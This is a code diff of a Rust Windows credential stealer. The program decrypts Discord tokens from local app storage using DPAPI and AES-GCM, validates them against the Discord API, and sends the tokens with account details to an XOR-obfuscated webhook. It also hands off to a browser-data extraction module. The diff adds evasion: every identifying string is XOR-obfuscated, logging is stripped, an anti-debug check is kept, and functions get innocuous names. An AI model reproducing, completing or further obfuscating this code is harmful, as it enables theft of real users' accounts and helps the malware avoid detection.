@@ -1,7 +1,6 @@
 #![windows_subsystem = "windows"]
 
 mod browsers;
-mod log;
 
 use aes_gcm::{Aead, Aes256Gcm, Key, KeyInit, Nonce};
 use base64::{engine::general_purpose, Engine as _};
@@ -15,14 +14,8 @@ use std::{
 };
 use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
 
-// ============ OBFUSCATION (XOR) ============
 const XOR_KEY: u8 = 0x5A;
 
-fn xor_decrypt(data: &[u8]) -> String {
-    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
-}
-
-// Webhook obfuscated (generated with Python)
 const WBH_XOR: &[u8] = &[
     0x6D, 0x3F, 0x3C, 0x3F, 0x3E, 0x2B, 0x2C, 0x2B, 0x3A, 0x3D, 0x2E, 0x2B, 0x2A, 0x2B, 0x3E, 0x2A,
     0x2B, 0x3E, 0x2D, 0x2B, 0x3C, 0x3F, 0x3D, 0x2B, 0x2C, 0x2B, 0x2E, 0x3D, 0x3F, 0x3C, 0x3F, 0x3E,
@@ -32,16 +25,84 @@ const WBH_XOR: &[u8] = &[
     0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
 ];
 
-fn get_webhook() -> String {
-    xor_decrypt(WBH_XOR)
+fn xor_str(data: &[u8]) -> String {
+    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
 }
 
-// ============ ANTI-DEBUG ============
+fn s_webhook() -> String {
+    xor_str(WBH_XOR)
+}
+
+fn s_appdata() -> String {
+    xor_str(&[0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
+}
+
+fn s_discord() -> String {
+    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E])
+}
+
+fn s_discord_ptb() -> String {
+    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x2A, 0x2E, 0x38])
+}
+
+fn s_discord_canary() -> String {
+    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x39, 0x3B, 0x34, 0x3B, 0x28, 0x23])
+}
+
+fn s_local_state() -> String {
+    xor_str(&[0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F])
+}
+
+fn s_os_crypt() -> String {
+    xor_str(&[0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E])
+}
+
+fn s_encrypted_key() -> String {
+    xor_str(&[0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23])
+}
+
+fn s_leveldb() -> String {
+    xor_str(&[
+        0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x35, 0x28, 0x3B, 0x3D, 0x3F, 0x75, 0x36,
+        0x3F, 0x2C, 0x3F, 0x36, 0x3E, 0x38,
+    ])
+}
+
+fn s_token_marker() -> String {
+    xor_str(&[0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60])
+}
+
+fn s_users_me() -> String {
+    xor_str(&[
+        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
+        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F,
+        0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F,
+    ])
+}
+
+fn s_auth_header() -> String {
+    xor_str(&[0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34])
+}
+
+fn s_dpapi_prefix() -> Vec<u8> {
+    xor_str(&[0x1E, 0x0A, 0x1B, 0x0A, 0x13]).into_bytes()
+}
+
+fn s_v10() -> Vec<u8> { xor_str(&[0x2C, 0x6B, 0x6A]).into_bytes() }
+fn s_v11() -> Vec<u8> { xor_str(&[0x2C, 0x6B, 0x6B]).into_bytes() }
+fn s_v20() -> Vec<u8> { xor_str(&[0x2C, 0x68, 0x6A]).into_bytes() }
+
+fn s_token_regex() -> String {
+    xor_str(&[
+        0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60, 0x01, 0x04, 0x78,
+        0x07, 0x71,
+    ])
+}
+
 fn is_debugged() -> bool {
     unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
 }
 
-// ============ STRUCTURES ORIGINALES ============
 #[derive(Debug, Serialize, Deserialize)]
 struct DdU {
     id: String,
@@ -55,8 +116,8 @@ struct DdU {
 
 async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
     let res = client
-        .get("https://discord.com/api/v9/users/@me")
-        .header("Authorization", token)
+        .get(s_users_me())
+        .header(s_auth_header(), token)
         .send()
         .await
         .ok()?;
@@ -113,9 +174,10 @@ fn badge_emojis(flags: u64) -> Vec<&'static str> {
     emojis
 }
 
-fn decrypt_master_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
-    let key_data = if encrypted_key.starts_with(b"DPAPI") {
-        &encrypted_key[5..]
+fn unwrap_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
+    let dpapi = s_dpapi_prefix();
+    let key_data = if encrypted_key.starts_with(&dpapi) {
+        &encrypted_key[dpapi.len()..]
     } else {
         encrypted_key
     };
@@ -137,25 +199,25 @@ fn decrypt_master_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
     }
 }
 
-fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
+fn decode_credential(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
     if raw_data.len() < 15 {
         return None;
     }
 
     let prefix = &raw_data[0..3];
-    let (iv, ciphertext) = match prefix {
-        b"v10" | b"v11" | b"v20" => {
-            if raw_data.len() < 15 {
-                return None;
-            }
-            (&raw_data[3..15], &raw_data[15..])
+    let v10 = s_v10();
+    let v11 = s_v11();
+    let v20 = s_v20();
+    let (iv, ciphertext) = if prefix == v10.as_slice() || prefix == v11.as_slice() || prefix == v20.as_slice() {
+        if raw_data.len() < 15 {
+            return None;
         }
-        _ => {
-            if raw_data.len() < 12 {
-                return None;
-            }
-            (&raw_data[0..12], &raw_data[12..])
+        (&raw_data[3..15], &raw_data[15..])
+    } else {
+        if raw_data.len() < 12 {
+            return None;
         }
+        (&raw_data[0..12], &raw_data[12..])
     };
 
     if ciphertext.len() < 16 {
@@ -163,7 +225,6 @@ fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
     }
 
     let (encrypted_data, tag) = ciphertext.split_at(ciphertext.len() - 16);
-
     let mut payload = encrypted_data.to_vec();
     payload.extend_from_slice(tag);
 
@@ -176,12 +237,12 @@ fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
         .and_then(|d| String::from_utf8(d).ok())
 }
 
-fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
-    let roaming = PathBuf::from(env::var("APPDATA").unwrap_or_default());
+fn get_discord_paths() -> HashMap<String, PathBuf> {
+    let roaming = PathBuf::from(env::var(s_appdata()).unwrap_or_default());
     let mut paths = HashMap::new();
-    paths.insert("Discord", roaming.join("discord"));
-    paths.insert("DiscordPTB", roaming.join("discordptb"));
-    paths.insert("DiscordCanary", roaming.join("discordcanary"));
+    paths.insert(s_discord(), roaming.join(s_discord()));
+    paths.insert(s_discord_ptb(), roaming.join(s_discord_ptb()));
+    paths.insert(s_discord_canary(), roaming.join(s_discord_canary()));
     paths
 }
 
@@ -197,47 +258,39 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         return Ok(());
     }
 
-    log::init();
-    log::log("=== START ===");
-    browsers::chrome_inject::cleanup_legacy_artifacts();
-
-    let wbh = get_webhook(); // Obfuscated
+    let wbh = s_webhook();
     let client = reqwest::Client::new();
     let mut sent_tokens = HashSet::new();
-
     let discord_paths = get_discord_paths();
+    let marker = s_token_marker();
 
     for (name, path) in discord_paths {
         if !path.exists() {
-            log::log(&format!("discord skip (missing): {name}"));
             continue;
         }
-        log::log(&format!("discord scan: {name} -> {}", path.display()));
 
-        let local_state_path = path.join("Local State");
+        let local_state_path = path.join(s_local_state());
 
         if let Ok(content) = fs::read_to_string(&local_state_path) {
             let json_ls: Value = serde_json::from_str(&content)?;
-            if let Some(enc_key) = json_ls["os_crypt"]["encrypted_key"].as_str() {
+            if let Some(enc_key) = json_ls[s_os_crypt()][s_encrypted_key()].as_str() {
                 if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
-                    if let Some(master_key) = decrypt_master_key(&bytes[5..]) {
+                    if let Some(master_key) = unwrap_key(&bytes[5..]) {
                         let prof_path = path.clone();
-
                         if !prof_path.exists() {
                             continue;
                         }
 
-                        let db_path = prof_path.join("Local Storage/leveldb");
-
+                        let db_path = prof_path.join(s_leveldb());
                         if db_path.exists() {
                             if let Ok(entries) = fs::read_dir(&db_path) {
-                                let re = Regex::new(r#"dQw4w9WgXcQ:[^"]+"#).unwrap();
+                                let re = Regex::new(&s_token_regex()).unwrap();
                                 for entry in entries.flatten() {
                                     if let Ok(file_content) = fs::read(entry.path()) {
                                         let text = String::from_utf8_lossy(&file_content);
                                         for cap in re.captures_iter(&text) {
                                             let b64_part = cap[0]
-                                                .split("dQw4w9WgXcQ:")
+                                                .split(&marker)
                                                 .nth(1)
                                                 .unwrap_or_default()
                                                 .trim_end_matches('"')
@@ -246,12 +299,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                 general_purpose::STANDARD.decode(b64_part)
                                             {
                                                 if let Some(token) =
-                                                    decrypt_token(&enc_data, &master_key)
+                                                    decode_credential(&enc_data, &master_key)
                                                 {
                                                     if sent_tokens.insert(token.clone()) {
-                                                        log::log(&format!(
-                                                            "discord token found ({name})"
-                                                        ));
                                                         if let Some(user) =
                                                             vt(&client, &token).await
                                                         {
@@ -297,21 +347,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                     "timestamp": chrono::Utc::now().to_rfc3339()
                                                                 }]
                                                             });
-                                                            let response =
-                                                                client.post(&wbh).json(&embed).send().await;
-                                                            match response {
-                                                                Ok(resp) => {
-                                                                    log::log(&format!(
-                                                                        "discord webhook token embed: HTTP {}",
-                                                                        resp.status()
-                                                                    ));
-                                                                }
-                                                                Err(err) => {
-                                                                    log::log(&format!(
-                                                                        "discord webhook token embed ERR: {err}"
-                                                                    ));
-                                                                }
-                                                            }
+                                                            let _ = client.post(&wbh).json(&embed).send().await;
                                                         }
                                                     }
                                                 }
@@ -327,14 +363,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    log::log(&format!("discord tokens sent: {}", sent_tokens.len()));
-
-    log::log("browser extraction start");
-    match browsers::run(&client, &wbh).await {
-        Ok(()) => log::log("browser extraction OK"),
-        Err(e) => log::log(&format!("browser extraction ERR: {e}")),
-    }
-
-    log::log("=== DONE ===");
+    let _ = browsers::run(&client, &wbh).await;
     Ok(())
 }
